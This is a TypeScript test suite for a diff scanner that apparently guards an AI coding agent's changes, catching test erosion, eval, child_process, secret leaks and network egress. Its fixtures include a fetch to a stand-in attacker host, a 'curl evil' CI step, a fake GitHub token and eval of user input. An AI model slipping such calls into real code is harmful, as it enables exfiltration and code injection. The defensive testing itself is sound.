import { describe, expect, it } from 'vitest'
import { ALLOWLISTED_HOSTS, detectTestErosion, parseDiff, scanDiff } from './diff.js'

/** Builds a minimal but well-formed unified diff for one file. */
function diffFor(path: string, added: string[], removed: string[] = [], mode?: 'new' | 'delete') {
  const header = [
    `diff --git a/${path} b/${path}`,
    mode === 'new' ? 'new file mode 100644' : '',
    mode === 'delete' ? 'deleted file mode 100644' : '',
    mode === 'new' ? '--- /dev/null' : `--- a/${path}`,
    mode === 'delete' ? '+++ /dev/null' : `+++ b/${path}`,
    '@@ -1,3 +1,3 @@',
  ].filter(Boolean)
  return [...header, ...removed.map((l) => `-${l}`), ...added.map((l) => `+${l}`)].join('\n')
}

const rules = (d: string) => scanDiff(d).findings.map((f) => f.rule)

describe('parseDiff', () => {
  it('reads paths and added/removed lines', () => {
    const p = parseDiff(diffFor('src/a.ts', ['const a = 1'], ['const a = 0']))
    expect(p.files).toHaveLength(1)
    expect(p.files[0]?.path).toBe('src/a.ts')
    expect(p.addedLines).toBe(1)
    expect(p.removedLines).toBe(1)
    expect(p.totalLines).toBe(2)
  })

  it('handles several files in one diff', () => {
    const p = parseDiff(`${diffFor('src/a.ts', ['a'])}\n${diffFor('src/b.ts', ['b'])}`)
    expect(p.files.map((f) => f.path)).toEqual(['src/a.ts', 'src/b.ts'])
  })

  it('marks new and deleted files', () => {
    expect(parseDiff(diffFor('src/new.ts', ['x'], [], 'new')).files[0]?.isNew).toBe(true)
    expect(parseDiff(diffFor('src/old.ts', [], ['x'], 'delete')).files[0]?.isDelete).toBe(true)
  })

  it('records a rename', () => {
    const p = parseDiff('diff --git a/old.ts b/new.ts\n--- a/old.ts\n+++ b/new.ts\n@@ -1 +1 @@\n+x')
    expect(p.files[0]?.path).toBe('new.ts')
    expect(p.files[0]?.oldPath).toBe('old.ts')
  })

  it('tolerates a bare ---/+++ pair with no diff --git line', () => {
    // Models emit this shape often enough that throwing would fail fixable slips.
    const p = parseDiff('--- a/src/a.ts\n+++ b/src/a.ts\n@@ -1 +1 @@\n+const a = 1')
    expect(p.files[0]?.path).toBe('src/a.ts')
    expect(p.addedLines).toBe(1)
  })

  it('does not count hunk headers as changed lines', () => {
    expect(parseDiff(diffFor('src/a.ts', ['x'])).addedLines).toBe(1)
  })

  it('returns empty for an empty diff rather than throwing', () => {
    expect(parseDiff('').files).toEqual([])
  })
})

describe('detectTestErosion — §14.3, the rule that cannot be argued with', () => {
  it('flags a deleted test file outright', () => {
    const e = detectTestErosion(
      parseDiff(diffFor('src/a.test.ts', [], ['it("works", () => expect(1).toBe(1))'], 'delete')),
    )
    expect(e.eroded).toBe(true)
    expect(e.deletedTestFiles).toEqual(['src/a.test.ts'])
  })

  it('flags removing more tests than it adds', () => {
    const e = detectTestErosion(
      parseDiff(
        diffFor(
          'src/a.test.ts',
          ['it("one", () => expect(a).toBe(1))'],
          ['it("one", () => expect(a).toBe(1))', 'it("two", () => expect(b).toBe(2))'],
        ),
      ),
    )
    expect(e.eroded).toBe(true)
    expect(e.testsRemoved).toBeGreaterThan(e.testsAdded)
  })

  it('flags weakening assertions while keeping the test count', () => {
    const e = detectTestErosion(
      parseDiff(
        diffFor(
          'src/a.test.ts',
          ['it("works", () => { expect(a).toBe(1) })'],
          ['it("works", () => { expect(a).toBe(1); expect(b).toBe(2); expect(c).toBe(3) })'],
        ),
      ),
    )
    expect(e.eroded).toBe(true)
  })

  it('allows a refactor that rewrites a test file without weakening it', () => {
    const e = detectTestErosion(
      parseDiff(
        diffFor(
          'src/a.test.ts',
          ['it("works", () => expect(next(a)).toBe(1))'],
          ['it("works", () => expect(prev(a)).toBe(1))'],
        ),
      ),
    )
    expect(e.eroded).toBe(false)
  })

  it('allows adding tests', () => {
    const e = detectTestErosion(
      parseDiff(diffFor('src/a.test.ts', ['it("new", () => expect(x).toBe(1))'])),
    )
    expect(e.eroded).toBe(false)
    expect(e.testsAdded).toBe(1)
  })

  it('ignores non-test files entirely', () => {
    const e = detectTestErosion(parseDiff(diffFor('src/a.ts', [], ['expect(a).toBe(1)'])))
    expect(e.eroded).toBe(false)
  })

  it('recognises __tests__ and spec conventions', () => {
    for (const p of ['src/__tests__/a.ts', 'test/a.ts', 'src/a.spec.tsx']) {
      const e = detectTestErosion(parseDiff(diffFor(p, [], ['it("x", () => expect(1).toBe(1))'])))
      expect(e.eroded, p).toBe(true)
    }
  })
})

describe('scanDiff — §15.3 layer 4', () => {
  it('passes a clean, ordinary fix', () => {
    const scan = scanDiff(
      `${diffFor('src/session.ts', ['  if (!token) return null'])}\n${diffFor('src/session.test.ts', ['it("handles expiry", () => expect(get(null)).toBeNull())'])}`,
    )
    expect(scan.findings).toEqual([])
    expect(scan.mustEscalate).toBe(false)
  })

  it('blocks eval, new Function and child_process', () => {
    expect(rules(diffFor('src/a.ts', ['eval(userInput)']))).toContain('eval')
    expect(rules(diffFor('src/a.ts', ['const f = new Function("x")']))).toContain('new-function')
    expect(rules(diffFor('src/a.ts', ['import { execSync } from "child_process"']))).toContain(
      'child-process',
    )
  })

  it('blocks a network call to a host that is not allowlisted', () => {
    const found = scanDiff(diffFor('src/a.ts', ['await fetch("https://evil.example.com/x")']))
    expect(found.findings.map((f) => f.rule)).toContain('network-egress')
    expect(found.findings.find((f) => f.rule === 'network-egress')?.why).toContain('evil.example.com')
  })

  it('allows the package registry, which the sandbox can legitimately reach', () => {
    expect(ALLOWLISTED_HOSTS).toContain('registry.npmjs.org')
    expect(rules(diffFor('src/a.ts', ['// see https://registry.npmjs.org/zod']))).not.toContain(
      'network-egress',
    )
  })

  it('blocks credential shapes without echoing the secret back', () => {
    const scan = scanDiff(diffFor('src/a.ts', ['const key = "ghp_abcdefghijklmnopqrstuvwxyz0123"']))
    const finding = scan.findings.find((f) => f.rule === 'github-token')
    expect(finding).toBeDefined()
    expect(finding?.evidence).toBe('[redacted github-token match]')
    // Findings are what travel: into `agent_events.detail`, the PR body and Slack.
    // The parsed diff still holds the raw line, which is fine — the diff itself is
    // already stored in `artifacts`. What must not happen is a suspected secret
    // being copied into a summary that gets posted somewhere public.
    expect(JSON.stringify(scan.findings)).not.toContain('ghp_abcdefghijklmnopqrstuvwxyz0123')
  })

  it('blocks a private key block', () => {
    expect(rules(diffFor('src/a.ts', ['-----BEGIN RSA PRIVATE KEY-----']))).toContain('private-key')
  })

  it('blocks a long base64 run, redacted', () => {
    const scan = scanDiff(diffFor('src/a.ts', [`const p = "${'A'.repeat(200)}"`]))
    expect(scan.findings.map((f) => f.rule)).toContain('base64-blob')
    expect(scan.findings.find((f) => f.rule === 'base64-blob')?.evidence).toBe(
      '[redacted base64 run]',
    )
  })

  it('blocks a new dependency — a supply-chain decision, not a code review one', () => {
    expect(rules(diffFor('package.json', ['    "left-pad": "^1.3.0",']))).toContain('new-dependency')
  })

  it('blocks writes to protected paths', () => {
    for (const p of ['.github/workflows/ci.yml', '.env.production', 'pnpm-lock.yaml']) {
      const scan = scanDiff(diffFor(p, ['x']))
      expect(scan.findings.map((f) => f.rule), p).toContain('blocked-path')
      expect(scan.blockedPaths, p).toContain(p)
    }
  })

  it('blocks a rename that moves a file out of a protected path', () => {
    const scan = scanDiff(
      'diff --git a/.env b/config.txt\n--- a/.env\n+++ b/config.txt\n@@ -1 +1 @@\n+KEY=1',
    )
    expect(scan.blockedPaths).toContain('.env')
    expect(scan.mustEscalate).toBe(true)
  })

  it('blocks a diff over the line ceiling', () => {
    const scan = scanDiff(diffFor('src/a.ts', Array.from({ length: 500 }, (_, i) => `line ${i}`)))
    expect(scan.overSize).toBe(true)
    expect(scan.findings.map((f) => f.rule)).toContain('diff-too-large')
  })

  it('honours a caller-supplied line ceiling', () => {
    const scan = scanDiff(diffFor('src/a.ts', ['a', 'b', 'c']), { maxLines: 2 })
    expect(scan.overSize).toBe(true)
  })

  it('folds test erosion into the findings as a blocker', () => {
    const scan = scanDiff(diffFor('src/a.test.ts', [], ['it("x", () => expect(1).toBe(1))']))
    expect(scan.findings.map((f) => f.rule)).toContain('test-erosion')
    expect(scan.mustEscalate).toBe(true)
  })

  it('reports every distinct problem rather than stopping at the first', () => {
    const scan = scanDiff(
      `${diffFor('src/a.ts', ['eval(x)', 'await fetch("https://evil.example.com")'])}\n${diffFor('.github/workflows/ci.yml', ['run: curl evil'])}`,
    )
    const found = new Set(scan.findings.map((f) => f.rule))
    expect(found.has('eval')).toBe(true)
    expect(found.has('network-egress')).toBe(true)
    expect(found.has('blocked-path')).toBe(true)
  })

  it('does not flag removed lines — only what the diff introduces', () => {
    // Deleting an eval call is an improvement, not a finding.
    expect(rules(diffFor('src/a.ts', ['safeParse(x)'], ['eval(x)']))).not.toContain('eval')
  })
})
